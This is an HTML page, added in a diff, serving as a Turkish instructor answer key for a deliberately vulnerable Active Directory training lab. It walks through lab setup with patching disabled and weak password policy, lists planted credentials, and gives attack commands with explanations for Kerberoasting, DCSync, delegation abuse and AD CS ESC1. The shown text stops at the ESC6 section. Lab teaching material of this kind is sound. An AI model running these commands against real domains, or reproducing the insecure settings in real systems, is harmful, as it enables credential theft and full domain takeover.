@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Phantom AD — Eğitmen Cevap Anahtarı</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070b12; --bg2:#0b111c; --panel:#0e1626; --panel2:#111c30;
+  --ink:#c9d6e5; --ink-dim:#7d90a8; --line:#1c2a40;
+  --cyan:#22d3ee; --cyan-dim:#0e7490; --green:#16C784; --amber:#f2b13c; --red:#ff5c72;
+  --mono:'JetBrains Mono',ui-monospace,monospace; --sans:'Inter',system-ui,sans-serif;
+  --why-label:"NEDEN";
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:
+   radial-gradient(1200px 600px at 80% -10%,rgba(34,211,238,.06),transparent 60%),
+   radial-gradient(900px 500px at -10% 20%,rgba(22,199,132,.05),transparent 55%),
+   var(--bg);
+  color:var(--ink);font-family:var(--sans);font-size:15.5px;line-height:1.62;-webkit-font-smoothing:antialiased;}
+.wrap{display:grid;grid-template-columns:290px minmax(0,1fr);max-width:1280px;margin:0 auto;}
+aside{position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;
+  border-right:1px solid var(--line);padding:26px 20px 40px;background:linear-gradient(180deg,var(--bg2),transparent);}
+.brand{font-family:var(--mono);font-weight:800;letter-spacing:.14em;font-size:13px;color:var(--cyan);}
+.brand .ph{color:var(--ink);}
+.brand-sub{font-family:var(--mono);font-size:10.5px;color:var(--ink-dim);letter-spacing:.2em;margin-top:6px;text-transform:uppercase;}
+.rule{height:1px;background:var(--line);margin:20px 0;}
+.toc-link{display:flex;gap:10px;align-items:baseline;text-decoration:none;color:var(--ink-dim);
+  padding:6px 8px;border-radius:7px;font-size:13px;transition:.15s;border:1px solid transparent;}
+.toc-link:hover{color:var(--ink);background:var(--panel);border-color:var(--line);}
+.toc-num{font-family:var(--mono);font-size:11px;color:var(--cyan-dim);min-width:20px;font-weight:700;}
+.tag{display:inline-block;font-family:var(--mono);font-size:10px;letter-spacing:.12em;color:var(--green);
+  border:1px solid rgba(22,199,132,.35);border-radius:999px;padding:3px 9px;margin-top:18px;text-transform:uppercase;}
+main{padding:0 0 90px;min-width:0;}
+.hero{padding:64px 56px 40px;border-bottom:1px solid var(--line);position:relative;overflow:hidden;}
+.hero::before{content:"";position:absolute;inset:0;
+  background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);
+  background-size:34px 34px;opacity:.14;mask:radial-gradient(600px 300px at 30% 0%,#000,transparent 70%);}
+.hero h1{position:relative;font-family:var(--mono);font-weight:800;font-size:40px;line-height:1.05;margin:0 0 4px;letter-spacing:-.01em;color:#eaf2fb;}
+.hero h1 .g{color:var(--cyan);}
+.hero .lede{position:relative;color:var(--ink-dim);max-width:62ch;margin:14px 0 0;}
+.hero .meta{position:relative;display:flex;flex-wrap:wrap;gap:8px;margin-top:22px;}
+.chip{font-family:var(--mono);font-size:11.5px;color:var(--ink);background:var(--panel);border:1px solid var(--line);padding:6px 11px;border-radius:8px;}
+.chip b{color:var(--cyan);font-weight:700;}
+.credit{position:relative;font-family:var(--mono);font-size:11px;color:var(--ink-dim);margin-top:18px;letter-spacing:.08em;}
+.content{padding:8px 56px 0;}
+.content h2{font-family:var(--mono);font-weight:800;font-size:22px;color:#eaf2fb;margin:52px 0 4px;
+  padding-top:26px;border-top:1px solid var(--line);letter-spacing:-.01em;scroll-margin-top:12px;}
+.content h2:first-of-type{border-top:none;margin-top:26px;}
+.content h3{font-family:var(--mono);font-weight:700;font-size:15.5px;color:var(--cyan);margin:30px 0 6px;}
+.content p{margin:12px 0;}
+.content a{color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(34,211,238,.3);}
+.content a:hover{border-color:var(--cyan);}
+.content ol,.content ul{padding-left:20px;} .content li{margin:6px 0;}
+.content strong{color:#e7eef8;font-weight:600;}
+code{font-family:var(--mono);font-size:.86em;background:rgba(34,211,238,.09);color:#a7ecf7;padding:2px 6px;border-radius:5px;border:1px solid rgba(34,211,238,.14);}
+pre{background:linear-gradient(180deg,#0a1220,#0a0f19);border:1px solid var(--line);border-left:3px solid var(--cyan);
+  border-radius:10px;padding:16px 18px;overflow-x:auto;margin:16px 0;position:relative;}
+pre code{background:none;border:none;padding:0;color:#cfe6ee;font-size:13px;line-height:1.7;}
+pre::before{content:"bash";position:absolute;top:8px;right:12px;font-family:var(--mono);font-size:10px;color:var(--ink-dim);letter-spacing:.16em;text-transform:uppercase;}
+blockquote{border-left:3px solid var(--green);background:rgba(22,199,132,.05);margin:18px 0;padding:10px 18px;border-radius:0 8px 8px 0;color:var(--ink);}
+blockquote p{margin:6px 0;font-family:var(--mono);font-size:13px;}
+/* why / neden callout */
+blockquote.why{border-left:3px solid var(--amber);background:rgba(242,177,60,.06);position:relative;padding-top:26px;}
+blockquote.why::before{content:var(--why-label);position:absolute;top:8px;left:18px;font-family:var(--mono);
+  font-size:9.5px;letter-spacing:.18em;color:var(--amber);font-weight:700;}
+blockquote.why strong{color:var(--amber);}
+blockquote.why p{font-family:var(--sans);font-size:13.5px;line-height:1.55;}
+table{width:100%;border-collapse:collapse;margin:18px 0;font-size:13.5px;border:1px solid var(--line);border-radius:10px;overflow:hidden;display:block;overflow-x:auto;}
+thead th{background:var(--panel2);color:var(--cyan);font-family:var(--mono);font-weight:700;text-align:left;font-size:11.5px;letter-spacing:.06em;text-transform:uppercase;padding:11px 14px;border-bottom:1px solid var(--line);}
+tbody td{padding:10px 14px;border-bottom:1px solid var(--line);vertical-align:top;}
+tbody tr:nth-child(even){background:rgba(255,255,255,.015);}
+tbody tr:hover{background:rgba(34,211,238,.04);}
+tbody td code{white-space:nowrap;}
+.footer{padding:40px 56px 0;color:var(--ink-dim);font-family:var(--mono);font-size:12px;}
+@media (max-width:960px){.wrap{grid-template-columns:1fr;} aside{position:static;height:auto;border-right:none;border-bottom:1px solid var(--line);} .hero,.content,.footer{padding-left:24px;padding-right:24px;} .hero h1{font-size:30px;}}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside>
+    <div class="brand"><span class="ph">PHANTOM</span> · AD</div>
+    <div class="brand-sub">Eğitmen Cevap Anahtarı</div>
+    <div class="tag">Deterministik · seed 1337</div>
+    <div class="rule"></div>
+    <nav><a href="#kurulum-once-dcyi-hazrla-lab-scriptinden-once-calstr" class="toc-link"><span class="toc-num">»</span><span>Kurulum</span></a>
+<a href="#0-temel-bilgiler-ground-truth" class="toc-link"><span class="toc-num">00</span><span>Temel bilgiler</span></a>
+<a href="#1-kimlik-bilgisi-hzl-referans-planlanms-tahmin-edilebilir" class="toc-link"><span class="toc-num">01</span><span>Kimlik bilgisi hızlı referansı</span></a>
+<a href="#11-paylasim-haritas" class="toc-link"><span class="toc-num">1.1</span><span>Paylaşım haritası</span></a>
+<a href="#2-kesif-kimlik-dogrulamasz" class="toc-link"><span class="toc-num">02</span><span>Keşif</span></a>
+<a href="#3-ilk-erisim-initial-access" class="toc-link"><span class="toc-num">03</span><span>İlk erişim</span></a>
+<a href="#4-domain-enumeration-bloodhound" class="toc-link"><span class="toc-num">04</span><span>Domain enumeration</span></a>
+<a href="#5-roasting" class="toc-link"><span class="toc-num">05</span><span>Roasting</span></a>
+<a href="#6-acl-abuse-ve-dcsync" class="toc-link"><span class="toc-num">06</span><span>ACL abuse ve DCSync</span></a>
+<a href="#7-delegation" class="toc-link"><span class="toc-num">07</span><span>Delegation</span></a>
+<a href="#8-ad-cs" class="toc-link"><span class="toc-num">08</span><span>AD CS</span></a>
+<a href="#9-coercion-relay-kaynag" class="toc-link"><span class="toc-num">09</span><span>Coercion</span></a>
+<a href="#10-network-cveler" class="toc-link"><span class="toc-num">10</span><span>Network CVE&#x27;ler</span></a>
+<a href="#11-local-privilege-escalation" class="toc-link"><span class="toc-num">11</span><span>Local privilege escalation</span></a>
+<a href="#115-bellekteki-kimlikler" class="toc-link"><span class="toc-num">11.5</span><span>Bellekteki kimlikler</span></a>
+<a href="#12-kalclk-persistence-ve-dc-ele-gecirme" class="toc-link"><span class="toc-num">12</span><span>Kalıcılık</span></a>
+<a href="#13-onerilen-kill-chainler" class="toc-link"><span class="toc-num">13</span><span>Önerilen kill-chain&#x27;ler</span></a>
+<a href="#14-blue-team-notlar" class="toc-link"><span class="toc-num">14</span><span>Blue-team notları</span></a></nav>
+    <div class="rule"></div>
+    <div class="credit">Design by<br>Emre Koybaşı</div>
+  </aside>
+  <main>
+    <header class="hero">
+      <h1>Phantom&nbsp;AD<br><span class="g">Saldırı Yol Haritası</span></h1>
+      <p class="lede">Phantom AD lab'ının eğitmen cevap anahtarı. Her planlanmış zafiyet için: script ne kuruyor, nerede, neden oluşuyor ve nasıl istismar edilir. Teknik terimler İngilizce bırakılmıştır.</p>
+      <div class="meta"><span class="chip">Domain <b>phantom.local</b></span>
+<span class="chip">Host <b>Server 2016 DC</b></span>
+<span class="chip">Kullanıcı <b>~50</b></span>
+<span class="chip">MAQ <b>10</b></span>
+<span class="chip">CA <b>Enterprise (DC'de)</b></span></div>
+      <div class="credit">Design by Emre Koybaşı</div>
+    </header>
+    <section class="content">
+<h1 id="phantom-ad-egitmen-cevap-anahtar-saldr-yol-haritas">Phantom AD — Eğitmen Cevap Anahtarı &amp; Saldırı Yol Haritası</h1>
+<blockquote>
+<p><strong>Ortam:</strong> <code>phantom.local</code> · tek Domain Controller · Windows Server 2016 · Build seed <code>1337</code>
+<strong>Design by Emre Koybaşı</strong></p>
+</blockquote>
+<p><code>PhantomCorp.ps1</code> ile kurulan Phantom AD lab'ının eğitmen tarafı cevap anahtarı. Her planlanmış zafiyet için: script <strong>ne</strong> kuruyor, <strong>nerede</strong>, <strong>neden</strong> oluşuyor ve <strong>nasıl</strong> istismar edilir — build'in ürettiği gerçek konfigürasyona göre. Build deterministiktir: her öğrenci <strong>aynı kullanıcı, parola ve grup üyeliklerini</strong> alır. Rastgele ama sabit kimlikler <code>generate.log</code> ve <code>VulnAD_Lab_Report.txt</code> (Masaüstü) dosyalarında yazılıdır.</p>
+<p>Teknik terimler (Kerberoasting, DCSync, RBCD, ESC1 vb.) bilinçli olarak İngilizce bırakılmıştır.</p>
+<hr />
+<h2 id="kurulum-once-dcyi-hazrla-lab-scriptinden-once-calstr">Kurulum — önce DC'yi hazırla (lab scriptinden önce çalıştır)</h2>
+<p><code>PhantomCorp.ps1</code> domaini <strong>kurmaz</strong>; <strong>var olan</strong> bir <code>phantom.local</code> DC'sini yapılandırır. Temiz bir <strong>Windows Server 2016</strong> (build <strong>14393.693</strong>, ilk boottan itibaren Windows Update KAPALI) ile başla. Her adımı <strong>yönetici PowerShell</strong>'de, sırayla yap.</p>
+
+<p><strong>Adım 1 — Makineyi DC1 yap (promote ETMEDEN önce). Yeniden başlar.</strong></p>
+<pre><code class="language-powershell">Rename-Computer -NewName "DC1" -Restart -Force</code></pre>
+
+<p><strong>Adım 2 — Reboot sonrası adın DC1 olduğunu doğrula.</strong></p>
+<pre><code class="language-powershell">hostname   # DC1 yazmalı</code></pre>
+
+<p><strong>Adım 3 — AD DS kur ve forest oluştur (otomatik reboot eder).</strong> Buradaki DSRM parolası, DSRM kalıcılık senaryosunun kullandığı paroladır — olduğu gibi bırak.</p>
+<pre><code class="language-powershell">Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
+
+Install-ADDSForest `
+  -DomainName "phantom.local" `
+  -DomainNetbiosName "PHANTOM" `
+  -InstallDns `
+  -SafeModeAdministratorPassword (ConvertTo-SecureString "DSRMpass123!" -AsPlainText -Force) `
+  -Force</code></pre>
+
+<p><strong>Adım 4 — (İsteğe bağlı) CVE-2014-6287 için zafiyetli HFS koy.</strong> Rejetto <strong>HFS 2.3 / 2.3b</strong> indir (2.3c veya 2.3m DEĞİL — onlar yamalı) ve <code>C:\HFS\hfs.exe</code> olarak kopyala. Koymazsan sadece o tek CVE atlanır, gerisi çalışır.</p>
+
+<p><strong>Adım 5 — Reboot sonrası lab scriptini DC'de bir kez çalıştır (yönetici).</strong></p>
+<pre><code class="language-powershell">cd C:\script\yolu
+.\PhantomCorp.ps1</code></pre>
+<p><strong>Bir kez</strong> çalıştır — build idempotent değildir. Her şeyi deterministik üretir (seed 1337), cheat sheet'i <code>C:\VulnAD-Build</code>'e yazar, 30 saniye sonra reboot eder.</p>
+
+<p><strong>Adım 6 — VM'i öğrenciler için export etmeden önce:</strong></p>
+<ol>
+<li><code>C:\VulnAD-Build</code>'i güvenli bir yere kopyala — içinde <code>generate.log</code> ve <code>VulnAD_Lab_Report.txt</code> var, tüm parolalar burada.</li>
+<li><strong><code>C:\VulnAD-Build</code>'i SİL</strong> ki öğrenciler okuyamasın.</li>
+<li><strong>VM snapshot al</strong> — Zerologon çalıştırılınca DC makine parolası bozulur, temiz bir dönüş noktası lazım.</li>
+<li>OVA/VHDX olarak export et. Her öğrenci birebir aynı labı alır (aynı kullanıcılar, parolalar, SID'ler image'da sabit).</li>
+</ol>
+
+<blockquote class="why"><p><strong>Bu build (14393.693):</strong> MS17-010 yamasının (14393.953) ve Zerologon yamasının (14393.3866) altında, yani <strong>hem EternalBlue hem Zerologon istismar edilebilir</strong>. Windows Update'i KAPALI tut ve export edilen VM'i asla yamalama, yoksa bu ikisi kapsamdan çıkar. <strong>Tüm belgelerde şirket adı:</strong> Phantom Corp.</p>
+</blockquote>
+<hr />
+<h2 id="0-temel-bilgiler-ground-truth">0. Temel bilgiler (ground truth)</h2>
+<table>
+<thead>
+<tr>
+<th>Öğe</th>
+<th>Değer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain</td>
+<td><code>phantom.local</code></td>
+</tr>
+<tr>
+<td>Topoloji</td>
+<td>Tek DC, Windows Server 2016, DC üzerinde Enterprise CA</td>
+</tr>
+<tr>
+<td>Determinizm</td>
+<td><code>Get-Random</code> yerine platform-bağımsız PRNG, seed <code>1337</code> — her makine/PowerShell sürümünde aynı roster</td>
+</tr>
+<tr>
+<td>Kullanıcılar</td>
+<td>50 (min 30), benzersiz <code>firstname.lastname</code> SamAccountName garantili</td>
+</tr>
+<tr>
+<td>Parola politikası</td>
+<td>Complexity <strong>kapalı</strong>, min uzunluk <strong>4</strong>, lockout threshold <strong>0 (hiç kilitlenmez)</strong></td>
+</tr>
+<tr>
+<td>Machine Account Quota</td>
+<td><code>10</code></td>
+</tr>
+<tr>
+<td>Loglar</td>
+<td><code>generate.log</code> (ayrıntılı) · <code>VulnAD_Lab_Report.txt</code> (ne/nerede haritası) — ikisi de <code>C:\VulnAD-Build</code> içinde, sadece Administrators, export öncesi sil</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Lockout:</strong> <code>LockoutThreshold</code> <strong>0</strong>, yani hesaplar hiç kilitlenmez. Bu sınav için bilinçli bir tercih — öğrenci AS-REP ya da spray hesaplarını kilitleyip takılamaz, spraying serbestçe yapılabilir. Gerçekçi kurumsal davranış istersen build script'inde <code>-LockoutThreshold 5</code> yap ve öğrencilere hesap başına pencere başına tek deneme yapmalarını söyle.</p>
+<hr />
+<h2 id="1-kimlik-bilgisi-hzl-referans-planlanms-tahmin-edilebilir">1. Kimlik bilgisi hızlı referansı (planlanmış / tahmin edilebilir)</h2>
+<table>
+<thead>
+<tr>
+<th>Hesap</th>
+<th>Sır</th>
+<th>Nerede</th>
+<th>Tip</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>WS-INTAKE$</code></td>
+<td><code>ws-intake</code></td>
+<td>Ön-hazırlanmış bilgisayar, anonim LDAP</td>
+<td><strong>Çalışan foothold</strong></td>
+</tr>
+<tr>
+<td><code>svc_deploy</code></td>
+<td><code>Deploy2024!</code></td>
+<td>Winlogon autologon <strong>ve</strong> <code>\\DC1\Common\IT-Notices\Deployment_Runbook_DRAFT.txt</code></td>
+<td><strong>Çalışan foothold</strong> (IT Helpdesk)</td>
+</tr>
+<tr>
+<td><code>websvc</code></td>
+<td><code>Websvc@2024!</code></td>
+<td>Constrained-delegation kullanıcısı (IT Helpdesk)</td>
+<td><strong>Çalışan</strong></td>
+</tr>
+<tr>
+<td><code>LocalAdmin</code></td>
+<td><code>LocalAdmin2024!</code></td>
+<td>SYSVOL <code>Groups.xml</code> içinde GPP <code>cpassword</code></td>
+<td><strong>Çalışan (local admin)</strong></td>
+</tr>
+<tr>
+<td><code>&lt;dnsadmin_user&gt;</code></td>
+<td><code>UberSecurePassword</code></td>
+<td><code>DnsAdmins</code> üyesi; ismi <code>generate.log</code>'da</td>
+<td><strong>Çalışan</strong></td>
+</tr>
+<tr>
+<td><code>app_svc</code></td>
+<td><code>AppS3rvice#2024</code></td>
+<td><code>\\DC1\Common\Config\appsettings.json</code></td>
+<td>Decoy</td>
+</tr>
+<tr>
+<td><code>svc_backup</code> / <code>old_admin</code> / <code>temp_helpdesk</code></td>
+<td><code>B4ckup2023!</code> / <code>Summer2022#</code> / <code>Helpdesk!23</code></td>
+<td><code>\\DC1\IT\Password_Backup.csv</code> (IT Helpdesk)</td>
+<td>Decoy / tuzak</td>
+</tr>
+</tbody>
+</table>
+<p><code>\\DC1\Common</code> herkese açık okunur (Everyone FullControl, Guest, null-session) ve gerçekçi kurumsal belgeler içerir. Public'e sızmış taslak runbook <code>svc_deploy</code>'u, onboarding rehberi spray desenini verir.</p>
+<h3 id="11-paylasim-haritas">1.1 Paylaşım haritası (Phantom Corp)</h3>
+<p>Departman paylaşımlarında NTFS kalıtımı kırıldı, her biri için ilgili grup gerekiyor. Lab'ın kademeli kısmı burası: öğrencinin bir sonraki departmanı okuyabilmek için yetki yükseltmesi gerekir.</p>
+<table>
+<thead>
+<tr><th>Paylaşım</th><th>Kim okuyabilir</th><th>Önemli içerik</th></tr>
+</thead>
+<tbody>
+<tr><td><code>\\DC1\Common</code></td><td><strong>Anonim / Guest</strong></td><td><code>IT-Notices\Deployment_Runbook_DRAFT.txt</code> (svc_deploy), <code>HR\Employee_Onboarding_Guide.txt</code> (spray deseni), <code>Notes\admin_notes.txt</code>, <code>Config\appsettings.json</code> (<code>app_svc</code>), <code>DNSrestart.ps1</code> (DnsAdmins ipucu), <code>Contracts\</code></td></tr>
+<tr><td><code>\\DC1\Finance</code></td><td><code>Accounting</code></td><td>Faturalar, banka mutabakatı, tedarikçi listesi, Q3 bütçe, masraf politikası</td></tr>
+<tr><td><code>\\DC1\HR</code></td><td><code>Senior management</code></td><td>Personel listesi, işe alım kayıtları</td></tr>
+<tr><td><code>\\DC1\Sales</code></td><td><code>Sales</code></td><td>Müşteri hesapları, Q4 pipeline</td></tr>
+<tr><td><code>\\DC1\IT</code></td><td><code>IT Helpdesk</code></td><td><code>Password_Backup.csv</code> (tuzak kimlikler), <code>Server_Inventory.csv</code>, <code>Network_Runbook.txt</code></td></tr>
+<tr><td><code>\\DC1\Backups</code></td><td><code>IT Admins</code> + <code>Backup Operators</code></td><td>Yedek dosyaları, config kopyaları</td></tr>
+</tbody>
+</table>
+<hr />
+<h2 id="2-kesif-kimlik-dogrulamasz">2. Keşif (kimlik doğrulamasız)</h2>
+<pre><code class="language-bash">nxc smb &lt;DC-IP&gt; -u '' -p '' --shares
+smbclient -N //&lt;DC-IP&gt;/Common      # -&gt; IT-Notices\Deployment_Runbook_DRAFT.txt (svc_deploy), Employee_Onboarding_Guide.txt (desen)
+nxc ldap &lt;DC-IP&gt; -u '' -p '' --users
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> DC, kimlik doğrulaması yapılmamış (anonymous) bağlantılara dizin okuma ve null-session paylaşım erişimi verecek şekilde yapılandırılmış (<code>EveryoneIncludesAnonymous=1</code>, <code>NullSessionShares</code>). Tek bir kimlik bilgisi olmadan tüm dizin envanteri çıkarılabilir.</p>
+</blockquote>
+<hr />
+<h2 id="3-ilk-erisim-initial-access">3. İlk erişim (initial access)</h2>
+<ol>
+<li><code>svc_deploy</code> / <code>Deploy2024!</code> (runbook, ya da foothold sonrası Winlogon autologon).</li>
+<li><code>WS-INTAKE$</code> / <code>ws-intake</code> (makine parolası == sam kökü).</li>
+<li>Password spray: <code>&lt;domain-öneki&gt;</code> + 3 hane (ör. <code>phantom042</code>) — birkaç Marketing/Sales/Accounting kullanıcısı bunu paylaşır. <strong>Hesap başına tek deneme, 1 dk pencereye dikkat.</strong></li>
+</ol>
+<pre><code class="language-bash">nxc ldap &lt;DC-IP&gt; -u svc_deploy -p 'Deploy2024!' --bloodhound -c all --dns-server &lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> kimlik bilgileri, herkesin erişebileceği yerlerde düz metin olarak duruyor (paylaşımdaki runbook, Winlogon registry) ve tahmin edilebilir bir varsayılan-parola deseni tek bir tahminle birden çok hesabı açıyor.</p>
+</blockquote>
+<hr />
+<h2 id="4-domain-enumeration-bloodhound">4. Domain enumeration (BloodHound)</h2>
+<pre><code class="language-bash">bloodhound-python -u svc_deploy -p 'Deploy2024!' -d phantom.local -ns &lt;DC-IP&gt; -c All
+</code></pre>
+<p>Graf, aşağıdaki tüm yolları ortaya çıkarır: ACL/DCSync kenarları, delegation, Shadow Credentials, DnsAdmins ve ayrıcalıklı grup ekleri.</p>
+<hr />
+<h2 id="5-roasting">5. Roasting</h2>
+<h3 id="51-kerberoasting">5.1 Kerberoasting</h3>
+<p>Zayıf parolalı, RC4-only üç SPN kullanıcısı; her biri rastgele bir mid-tier grupta.</p>
+<table>
+<thead>
+<tr>
+<th>Hesap</th>
+<th>SPN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mssql_svc</code></td>
+<td><code>mssql_svc/mssqlserver.phantom.local</code></td>
+</tr>
+<tr>
+<td><code>http_svc</code></td>
+<td><code>http_svc/httpserver.phantom.local</code></td>
+</tr>
+<tr>
+<td><code>exchange_svc</code></td>
+<td><code>exchange_svc/exserver.phantom.local</code></td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">impacket-GetUserSPNs phantom.local/svc_deploy:'Deploy2024!' -dc-ip &lt;DC-IP&gt; -request
+hashcat -m 13100 kerb.hash rockyou.txt
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> Kerberos tasarımı gereği, herhangi bir domain kullanıcısı SPN'i olan bir hesap için TGS bileti isteyebilir ve bu bilet hesabın parola hash'iyle şifrelenir. Burada hesaplar zayıf parolalı ve RC4'e zorlanmış (<code>msDS-SupportedEncryptionTypes=4</code>), dolayısıyla bilet offline hızlıca kırılır.</p>
+</blockquote>
+<h3 id="52-as-rep-roasting">5.2 AS-REP Roasting</h3>
+<p><code>DONT_REQ_PREAUTH</code> açık + zayıf parolalı 1–5 rastgele Marketing/Sales/Accounting kullanıcısı (<code>generate.log</code> → <code>AS-REPRoasting &lt;user&gt;</code>).</p>
+<pre><code class="language-bash">impacket-GetNPUsers phantom.local/ -dc-ip &lt;DC-IP&gt; -usersfile users.txt -no-pass
+hashcat -m 18200 asrep.hash rockyou.txt
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> bu hesaplarda Kerberos pre-authentication kapalı (<code>DONT_REQ_PREAUTH</code>), bu yüzden KDC kimliği doğrulamadan, kullanıcının parolasıyla şifrelenmiş AS-REP'i verir. Zayıf parola offline kırılır.</p>
+</blockquote>
+<hr />
+<h2 id="6-acl-abuse-ve-dcsync">6. ACL abuse ve DCSync</h2>
+<h3 id="61-kontrol-kenarlar">6.1 Kontrol kenarları</h3>
+<p><code>VulnAD-Acls</code> katmanlar arası grup→grup kenarları (<code>GenericAll</code>/<code>GenericWrite</code>/<code>WriteOwner</code>/<code>WriteDACL</code>/<code>Self</code>) yerleştirir; <code>VulnAD-BadAcls</code> bir initial-access kullanıcısından (<code>GenericAll</code> hedef üzerinde) yukarı doğru zincir kurar.</p>
+<pre><code class="language-bash">net rpc password &quot;&lt;victim&gt;&quot; &quot;NewPass1!&quot; -U phantom.local/&lt;attacker&gt;%&lt;pass&gt; -S &lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> principal'lara başka nesneler üzerinde aşırı yetki verilmiş. <code>GenericAll</code>/<code>WriteDACL</code>/<code>WriteOwner</code>/<code>GenericWrite</code>; hedefin parolasını sıfırlamaya, sahipliğini almaya ya da hedef adına saldırı (targeted Kerberoast / Shadow Credentials) kurmaya izin verir — kontrol, ayrıcalıklı bir şeye ulaşana dek zincirlenir.</p>
+</blockquote>
+<h3 id="62-dcsync">6.2 DCSync</h3>
+<p>Zincirin sonunda <code>VulnAD-DCSync</code>, bir hesaba domain üzerinde <strong>Replicating Directory Changes (All / In Filtered Set)</strong> verir (<code>generate.log</code> → <code>DCSync granted -&gt; &lt;acct&gt; (&lt;group&gt;)</code>).</p>
+<pre><code class="language-bash">impacket-secretsdump phantom.local/&lt;acct&gt;:'&lt;pass&gt;'@&lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> "Replicating Directory Changes" hakları, bir principal'ın DC-DC replikasyonunu taklit edip tüm parola hash'lerini (<code>krbtgt</code> dahil) çekmesine izin verir. Bunu DC olmayan bir hesaba vermek = tam domain ele geçirilmesi.</p>
+</blockquote>
+<hr />
+<h2 id="7-delegation">7. Delegation</h2>
+<h3 id="71-rbcd">7.1 RBCD</h3>
+<p><code>FILESRV$</code> bilgisayarı oluşturulur; rastgele bir IT Helpdesk kullanıcısı üzerinde <code>GenericWrite</code> sahibidir.</p>
+<pre><code class="language-bash">impacket-rbcd -delegate-to 'FILESRV$' -delegate-from 'ATTACKER$' -action write phantom.local/&lt;user&gt;:'&lt;pass&gt;'
+impacket-getST -spn cifs/FILESRV.phantom.local -impersonate Administrator 'phantom.local/ATTACKER$:&lt;pass&gt;'
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> bir bilgisayar üzerindeki <code>GenericWrite</code>, <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> yazmanı sağlar — yani Resource-Based Constrained Delegation'ı kontrol ettiğin bir makineye ayarlarsın, sonra S4U ile o bilgisayara herhangi biri (Administrator) olarak bilet alırsın.</p>
+</blockquote>
+<h3 id="72-constrained-delegation-protocol-transition">7.2 Constrained delegation + protocol transition</h3>
+<p><code>websvc</code> / <code>Websvc@2024!</code>; <code>msDS-AllowedToDelegateTo</code> = DC'nin CIFS/LDAP/HOST'u <strong>ve</strong> <code>TrustedToAuthForDelegation</code> açık.</p>
+<pre><code class="language-bash">impacket-getST -spn CIFS/DC1.phantom.local -impersonate Administrator phantom.local/websvc:'Websvc@2024!' -dc-ip &lt;DC-IP&gt;
+export KRB5CCNAME=Administrator.ccache &amp;&amp; impacket-secretsdump -k -no-pass DC1.phantom.local
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> hesap DC servislerine delege etmeye yetkili ve protocol transition (<code>TrustedToAuthForDelegation</code>) sayesinde, o kullanıcı hiç kimlik doğrulamadan <strong>herhangi biri adına</strong> bu servislere bilet isteyebilir. Parolasını bildiğin için doğrudan <code>CIFS/DC</code>'ye Administrator olarak S4U yaparsın.</p>
+</blockquote>
+<h3 id="73-unconstrained-delegation-enumteori">7.3 Unconstrained delegation (enum/teori)</h3>
+<p><code>SRV-LEGACY01$</code> <code>TRUSTED_FOR_DELEGATION</code> işaretli.</p>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> unconstrained-delegation host'una kimlik doğrulayan herkesin TGT'si o host'ta önbelleğe alınır. Bir coercion ile DC'yi zorlarsan DC'nin TGT'sini yakalarsın. Burada enum + teori için mevcut.</p>
+</blockquote>
+<hr />
+<h2 id="8-ad-cs">8. AD CS</h2>
+<h3 id="81-esc1-esc1template">8.1 ESC1 — <code>ESC1Template</code></h3>
+<p><code>ENROLLEE_SUPPLIES_SUBJECT</code>, Domain Users enroll, Client Authentication.</p>
+<pre><code class="language-bash">certipy req -u &lt;user&gt;@phantom.local -p '&lt;pass&gt;' -dc-ip &lt;DC-IP&gt; -ca &lt;CA-NAME&gt; -template ESC1Template -upn administrator@phantom.local
+certipy auth -pfx administrator.pfx -dc-ip &lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> template, başvurana kendi SAN'ını belirleme izni veriyor (<code>ENROLLEE_SUPPLIES_SUBJECT</code>) ve düşük yetkiliye kimlik doğrulayabilir bir sertifika için enroll hakkı tanıyor. Yani herhangi bir kullanıcı <code>SAN=Administrator</code> ile sertifika alıp (PKINIT) o kullanıcı olarak kimlik doğrular.</p>
+</blockquote>
+<h3 id="82-esc4-template-acl">8.2 ESC4 — template ACL</h3>
+<p>Rastgele bir Normal-tier grup, <code>ESC1Template</code> üzerinde <code>WriteDACL</code> sahibidir.</p>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> template'in DACL'ine yazma hakkı, grubun ESC1 koşullarını (ya da herhangi tehlikeli ayarı) remediation sonrası bile yeniden açabilmesi demektir.</p>
+</blockquote>
+<h3 id="83-esc6-ca-bayrag">8.3 ESC6 — CA bayrağı</h3>
+<p>CA'da <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> açık.</p>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> bu CA bayrağı <strong>her</strong> enroll edilebilir template'in saldırganın verdiği SAN'ı kabul etmesini sağlar — yani zararsız bir template bile Administrator'ı taklit etmek için kullanılır.</p>
